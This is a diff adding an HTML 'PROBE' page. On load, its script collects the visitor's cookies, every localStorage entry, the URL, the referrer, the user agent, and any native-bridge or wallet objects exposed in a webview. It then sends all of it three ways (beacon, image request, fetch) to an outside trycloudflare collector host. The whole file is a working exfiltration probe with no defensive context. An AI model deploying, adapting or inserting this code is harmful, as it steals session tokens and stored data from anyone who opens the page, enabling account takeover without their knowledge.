@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PROBE</title>
+<style>
+body{font-family:monospace;font-size:15px;word-break:break-all;margin:8px;background:#111;color:#0f0}
+h1{font-size:24px;color:#ff0;margin:4px 0}
+pre{white-space:pre-wrap;word-break:break-all;margin:2px 0;font-size:12px}
+.tag{color:#0ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h1>PROBE-HIT</h1>
+<div id="ts"></div>
+<div><span class="tag">URL:</span><pre id="u"></pre></div>
+<div><span class="tag">UA:</span><pre id="ua"></pre></div>
+<div><span class="tag">COOKIE:</span><pre id="c">(empty)</pre></div>
+<div><span class="tag">LS:</span><pre id="ls">(empty)</pre></div>
+<div><span class="tag">BRIDGE:</span><pre id="bk">(scanning...)</pre></div>
+<div><span class="tag">RESULT:</span><pre id="r">-</pre></div>
+<script>
+var COLLECTOR = 'https://waters-finances-wrestling-marked.trycloudflare.com';
+(function(){
+  var ts = new Date().toISOString();
+  document.getElementById('ts').textContent = ts;
+  document.getElementById('u').textContent = location.href;
+  document.getElementById('ua').textContent = navigator.userAgent;
+  try{ document.getElementById('c').textContent = document.cookie || '(empty)'; }catch(e){ document.getElementById('c').textContent='ERR:'+e; }
+  var lsK=[];
+  try{ for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);var v=localStorage.getItem(k)||'';lsK.push(k+' = '+v.substring(0,200));} }catch(e){ lsK.push('ERR:'+e); }
+  document.getElementById('ls').textContent = lsK.join('\n')||'(empty)';
+  var bk=[], re=/bridge|webview|jsb|native|hybrid|applet|wallet|lt\.|wind|nebula|dsbridge|h5|apsl|titanium|ArkWeb/i;
+  try{ for(var k2 in window){ try{ if(re.test(k2)){ var t=typeof window[k2]; var ex=''; if(t==='object'&&window[k2]){ex='{'+Object.keys(window[k2]).slice(0,20).join(',')+'}';} else if(t==='function'){ex='()';} bk.push(k2+' : '+t+ex);} }catch(e){} } }catch(e){}
+  document.getElementById('bk').textContent = bk.join('\n')||'(none)';
+
+  var payload={ts:ts,url:location.href,ref:document.referrer,ua:navigator.userAgent,cookie:document.cookie,ls:lsK,bk:bk};
+  var qs=encodeURIComponent(JSON.stringify(payload));
+  // fire-and-forget cross-origin beacons (no CORS read needed)
+  try{ navigator.sendBeacon(COLLECTOR+'/b?d='+qs); }catch(e){}
+  try{ new Image().src=COLLECTOR+'/i?d='+qs; }catch(e){}
+  try{ fetch(COLLECTOR+'/f?d='+qs,{mode:'no-cors'}); }catch(e){}
+  document.getElementById('r').textContent='beacon x3 sent to collector';
+})();
+</script>
+</body>
+</html>
